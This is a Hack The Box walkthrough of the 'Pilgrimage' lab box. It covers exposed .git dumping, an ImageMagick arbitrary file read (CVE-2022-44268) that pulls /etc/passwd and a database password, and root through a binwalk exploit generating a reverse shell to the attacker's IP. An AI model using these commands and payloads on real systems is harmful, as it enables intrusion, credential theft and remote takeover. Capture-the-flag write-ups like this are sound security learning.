---
title: HTB 4 - Pilgrimage
tag: htb
category: cyber
---

## Comments

My experience may be different from everyone else because I started enumerating on a broken box. From the start I could not see the main site page, so I was working on the assumption that there was no frontend and I was purely exploiting the backend .git repo. Turns out that the box was down and the next day everything ran smoothly again. Again, with this box I was able to find all the paths to exploit without referring to a walkthrough. 

## Walkthrough

Target IP: 

    10.10.11.219

### Enumeration

Start with nmap scan:

    PORT   STATE    SERVICE REASON      VERSION
    22/tcp filtered ssh     no-response
    80/tcp open     http    syn-ack     nginx 1.18.0
    | http-git: 
    |   10.10.11.219:80/.git/
    |     Git repository found!
    |     Repository description: Unnamed repository; edit this file 'description' to name the...
    |_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
    | http-methods: 
    |_  Supported Methods: GET HEAD POST
    |_http-server-header: nginx/1.18.0
    |_http-title: Pilgrimage - Shrink Your Images

Normal response, we see `ssh` and `http` ports open.

Interestingly, the `http` port is hosting a `.git` repo.

Trying to access http://10.10.11.219/.git/ returns a `403 FORBIDDEN`

After some googling, I found that while a `.git` repo can hide the main directory listing at `/`, you can bypass this by accessing the repo's inner directories directly.

Some common `.git` directories are:

    config
    description
    HEAD
    index
    hooks/
    info/
    logs/
    objects/
    refs/

I first attempted to access `http://10.10.11.219/.git/config` which gave me the download of the `config` file, showing that it is accessible.

I used this [tool](https://github.com/internetwache/GitTools/tree/master/Dumper) which is made to dump `.git` repos recursively, even if their listing is not public.

After installing the tool, follow the instructions and run:

    bash ./gitdumper.sh 'http://pilgrimage.htb/.git/' dump

Once done, we can explore the history recorded by `.git`

    git status

    >>

    On branch master
    Changes not staged for commit:
    (use "git add/rm <file>..." to update what will be committed)
    (use "git restore <file>..." to discard changes in working directory)
        deleted:    assets/bulletproof.php
        deleted:    assets/css/animate.css
        deleted:    assets/css/custom.css
        deleted:    assets/css/flex-slider.css
        deleted:    assets/css/fontawesome.css
        deleted:    assets/css/owl.css
        deleted:    assets/css/templatemo-woox-travel.css
        deleted:    assets/images/banner-04.jpg
        deleted:    assets/images/cta-bg.jpg
        deleted:    assets/js/custom.js
        deleted:    assets/js/isotope.js
        deleted:    assets/js/isotope.min.js
        deleted:    assets/js/owl-carousel.js
        deleted:    assets/js/popup.js
        deleted:    assets/js/tabs.js
        deleted:    assets/webfonts/fa-brands-400.ttf
        deleted:    assets/webfonts/fa-brands-400.woff2
        deleted:    assets/webfonts/fa-regular-400.ttf
        deleted:    assets/webfonts/fa-regular-400.woff2
        deleted:    assets/webfonts/fa-solid-900.ttf
        deleted:    assets/webfonts/fa-solid-900.woff2
        deleted:    assets/webfonts/fa-v4compatibility.ttf
        deleted:    assets/webfonts/fa-v4compatibility.woff2
        deleted:    dashboard.php
        deleted:    index.php
        deleted:    login.php
        deleted:    logout.php
        deleted:    magick
        deleted:    register.php
        deleted:    vendor/bootstrap/css/bootstrap.min.css
        deleted:    vendor/bootstrap/js/bootstrap.min.js
        deleted:    vendor/jquery/jquery.js
        deleted:    vendor/jquery/jquery.min.js
        deleted:    vendor/jquery/jquery.min.map
        deleted:    vendor/jquery/jquery.slim.js
        deleted:    vendor/jquery/jquery.slim.min.js
        deleted:    vendor/jquery/jquery.slim.min.map

These are all the server files. They were deleted but not committed, hence git can still restore them from its version control.

    git restore .

We have some interesting files in here:

    dashboard.php   index.php   login.php

**Key learning**: reading source code of applications help to understand how they function, and how their security can be bypassed!

**login.php**

We see how the server handles user authentication using a plaintext username/ password match in a `sqlite` database. Unfortunately, we cannot do SQL injection because the query uses a `prepare` function to sanitize any user input to ensure that inputs are purely strings which cannot be escaped.

**index.php** - at this point, I still didn't realise there was an actual frontend webpage.

The main page allows users to `POST` an image to the server via the `bulletproof.php` method. `bulletproof` is just a module that simplifies image uploads via PHP. The important stuff happens after the `bulletproof` function.


    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $image = new Bulletproof\Image($_FILES);
    if($image["toConvert"]) {
        $image->setLocation("/var/www/pilgrimage.htb/tmp");
        $image->setSize(100, 4000000);
        $image->setMime(array('png','jpeg'));
        $upload = $image->upload();
        if($upload) {
        $mime = ".png";
        $imagePath = $upload->getFullPath();
        if(mime_content_type($imagePath) === "image/jpeg") {
            $mime = ".jpeg";
        }
        $newname = uniqid();
        exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
        unlink($upload->getFullPath());
        $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
        if(isset($_SESSION['user'])) {
            $db = new PDO('sqlite:/var/db/pilgrimage');
            $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
            $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
        }
        header("Location: /?message=" . $upload_path . "&status=success");
        }
        else {
        header("Location: /?message=Image shrink failed&status=fail");
        }
    }
    else {
        header("Location: /?message=Image shrink failed&status=fail");
    }
    }

We have a very specific command that can be exploited:

    exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime)

`exec()` is the PHP command to run an external program. Also, periods `.` in PHP just concatenates multiple strings together, some of which are `$` string variables that were prepared by `bulletproof`.

Example:

Assuming the uploaded file is named UPLOAD.jpg which will be renamed a unique ID, the command that will be called is:

    /var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/UPLOAD.jpg -resize 50% /var/www/pilgrimage.htb/shrunk/RENAMED.jpg

What is this magick binary that is being called by the CLI?

This is the ImageMagick package which is used widely for various image editing functions. In this case, the website uses it to shrink images `-resize 50%`.

A search shows that it is vulnerable to [CVE-2022-44268 Arbitrary File Read](https://www.metabaseq.com/imagemagick-zero-days/)

> When ImageMagick performs operations such as resizing on a PNG file, it may include the content of a system file, given that the magick binary has the necessary permissions to read it. This vulnerability arises due to the mishandling of textual chunks within PNG files.<br><br>A malicious actor can exploit this vulnerability by crafting a PNG file or using an existing one and adding a textual chunk type (tEXt). These chunks consist of a keyword and a text string. In this case, if the keyword matches the string "profile" (without quotes), ImageMagick will interpret the accompanying text string as a filename and attempt to load its content as a raw profile. As a result, when the resized image is downloaded, it will contain the content of the remote file specified by the attacker."""

In other words, we can specify any file path as a string to the `profile` tag of the image metadata and ImageMagick will attempt to read and return the contents of that file back inside the processed .png metadata.

Since the webpage allows image upload and download, we can exploit this to upload our malicious .png, process it, and download the contents back.

There are many PoCs that do this. I used the one by [kljunowsky](https://github.com/kljunowsky/CVE-2022-44268) for its simplicity:

    python3 CVE-2022-44268.py --image imagetopoison.png --file-to-read /etc/hosts 

All its doing is adding a new `tExt` chunk to the image metadata.

Let's try it on the `/etc/passwd` file and then check the our poisoned image using `exiftool`
    
    python3 CVE-2022-44268.py --image imagetopoison.png --file-to-read /etc/passwd

    exiftool output.png

    >>
    ExifTool Version Number         : 12.40
    File Name                       : output.png
    Directory                       : .
    File Size                       : 13 KiB
    File Modification Date/Time     : 2023:10:10 22:51:27+08:00
    File Access Date/Time           : 2023:10:10 22:51:25+08:00
    File Inode Change Date/Time     : 2023:10:10 22:51:27+08:00
    File Permissions                : -rw-rw-r--
    File Type                       : PNG
    File Type Extension             : png
    MIME Type                       : image/png
    Image Width                     : 1920
    Image Height                    : 1080
    Bit Depth                       : 8
    Color Type                      : RGB
    Compression                     : Deflate/Inflate
    Filter                          : Adaptive
    Interlace                       : Adam7 Interlace
    Profile                         : /etc/passwd
    SRGB Rendering                  : Perceptual
    Gamma                           : 2.2
    Pixels Per Unit X               : 11811
    Pixels Per Unit Y               : 11811
    Pixel Units                     : meters
    Image Size                      : 1920x1080
    Megapixels                      : 2.1

After uploading this to the site and downloading the result, we get a file with the contents of `/etc/passwd` in hex:

    exiftool 652565526c078.png 

    >>

    ExifTool Version Number         : 12.40
    File Name                       : 652565526c078.png
    Directory                       : .
    File Size                       : 6.7 KiB
    File Modification Date/Time     : 2023:10:10 22:53:24+08:00
    File Access Date/Time           : 2023:10:10 22:53:24+08:00
    File Inode Change Date/Time     : 2023:10:10 22:53:24+08:00
    File Permissions                : -rw-rw-r--
    File Type                       : PNG
    File Type Extension             : png
    MIME Type                       : image/png
    Image Width                     : 960
    Image Height                    : 540
    Bit Depth                       : 8
    Color Type                      : RGB
    Compression                     : Deflate/Inflate
    Filter                          : Adaptive
    Interlace                       : Noninterlaced
    Gamma                           : 2.2
    White Point X                   : 0.3127
    White Point Y                   : 0.329
    Red X                           : 0.64
    Red Y                           : 0.33
    Green X                         : 0.3
    Green Y                         : 0.6
    Blue X                          : 0.15
    Blue Y                          : 0.06
    Background Color                : 255 255 255
    Pixels Per Unit X               : 11811
    Pixels Per Unit Y               : 11811
    Pixel Units                     : meters
    Modify Date                     : 2023:10:10 14:53:07
    Raw Profile Type                : ..    1437.726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d.6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f.6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e.2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269.6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f.62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d.65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a.2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a.783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f.6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372.2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73.706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31.303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f.6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573.722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d.646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b.75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f.7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69.7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67.696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73.62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d.5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e.6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334.3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e.2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374.656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72.6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65.6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e.0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052.65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f.6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973.74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573.796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69.7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c.6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d.652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78.3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f.7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f.737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938.3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a.
    Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
    Datecreate                      : 2023-10-10T14:53:06+00:00
    Datemodify                      : 2023-10-10T14:53:06+00:00
    Datetimestamp                   : 2023-10-10T14:53:06+00:00
    Image Size                      : 960x540
    Megapixels                      : 0.518

The contents of /etc/passwd are hex encoded in the `Raw Profile Type` field. Formatting them and doing a hex decode with `xxd`, we can reveal the contents:

    cat etcpasswd.txt | tr '.' '\n' > etcpasswd-format.txt
    xxd -r -p etcpasswd-format.txt

    >>

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
    _laurel:x:998:998::/var/log/laurel:/bin/false

Now that we know it works, we can try to read other system files. Note that this is called a Local File Inclusion (LFI) exploit, because local files are being included when the is processed. I tried to access the `/etc/shadow` file which stores all the password hashes, but the server does not have root access to read them.

Upon re-looking the `login.php` source code, there is a call to the `sqlite` database in `/var/db/pilgrimage` which was used for user authentication. We can try to get the data from this file instead.

Repeating the exploit for `/var/db/pilgrimage`, we get the following string:

    ��e��8|�StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_images_1imagesf�+tableusersusersCREATE TABLE users (use��-emilyabigchonkyboi123OT NULL, password TEXT NOT NULL))=indexsqlite_autoindex_users_1users
    ��      emily
    4

So user `emily` has password `abigchonkyboi123`.

We can `ssh` into `emily` and get the user.txt = 2ce93a8ecd9d9e87bd272d32df0b696

### Privilege Escalation

`emily` does not have sudo root privilege so we need another way to get root.

The next step is to check what are the processes running and see if any of them are running as root.

    ps -aux

While there are many system binaries running as root, we have a specific function `malwarescan.sh` that is a custom script! Taking a look inside...

    cat malwarescan.sh

    >>

    #!/bin/bash

    blacklist=("Executable script" "Microsoft executable")

    /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
            for banned in "${blacklist[@]}"; do
            if [[ "$binout" == *"$banned"* ]]; then
                /usr/bin/rm "$filename"
                break
            fi
        done
    done

ChatGPT is very useful in breaking down commands like these:

    This script appears to be a Bash script that monitors a specific directory (/var/www/pilgrimage.htb/shrunk/) for new file creations and takes certain actions based on the contents of those files. Let's break down what it does step by step:

    Shebang: The #!/bin/bash at the beginning of the script indicates that this is a Bash script and should be executed using the Bash shell.

    Blacklist: An array named blacklist is defined, containing two elements: "Executable script" and "Microsoft executable". These are likely keywords or phrases that the script will look for in the files created in the monitored directory.

    Inotifywait: The script uses the /usr/bin/inotifywait command to monitor the specified directory (/var/www/pilgrimage.htb/shrunk/) for events, specifically the "create" event, which occurs when a new file is created in that directory.

    While loop: The script enters a while loop that reads the output of inotifywait as it waits for file creation events. When a new file is created, the path to the created file is captured in the FILE variable.

    File name extraction: The script extracts the filename from the full path of the created file using a combination of commands. It uses tail to get the last part of the path and sed to extract the filename from the "CREATE" event message.

    Binwalk analysis: It then runs /usr/local/bin/binwalk -e "$filename" on the created file. binwalk is a tool for analyzing binary files. The -e flag specifies that the contents of the file should be extracted.

    Blacklist check: The script then iterates through the elements in the blacklist array and checks if the output of binwalk contains any of the banned keywords (e.g., "Executable script" or "Microsoft executable"). If a match is found, the script removes the file using /usr/bin/rm.

    Loop continues: The while loop continues to monitor the directory for new file creation events.

    In summary, this script is designed to monitor a directory for new file creations and perform a check using binwalk on the contents of these files. If the contents match any of the predefined banned keywords, the script deletes the file. This script is likely used for security or file content analysis to prevent specific types of files from being created in the specified directory.

The exploit lies in the use of `/binwalk` to extract the contents of a file. This means we can add code that gives us a root shell when binwalk opens it.

We will use this [PoC](https://github.com/adhikara13/CVE-2022-4510-WalkingPath) that hides a reverse shell command inside a `.png` file.

Run according to instructions and specify your IP and listener port.

    python exploit_generator.py reverse input.png [YOUR_IP] 9999

Our plan is:

1. Generate an `exploit.png` that contains hidden python code that tells the target to start a reverse shell with my listener on `9999`
2. Start a listener on `7777` on emily inside `/var/www/pilgrimage.htb/shrunk/`
3. Transfer the `exploit.png` over to emily.
4. In `emily`, trigger the `CREATE` event by explicitly `cp` the exploit.py into `/var/www/pilgrimage.htb/shrunk/`
5. `malwarescan.sh` will automatically `/binwalk -e` the `.png` and trigger the reverse shell

You **must** do a `cp` in (4) because the `CREATE` event does not trigger from `nc` or `scp` type transfers. I was facing this issue until I realised that `CREATE` looks for actions executed by the **local file system** while `nc` and `scp` are external actions.

Once the reverse shell is obtained, root.txt = 895e544dab7fbb01085ff0fc95d91387

*That's all for tonight, ciao.*


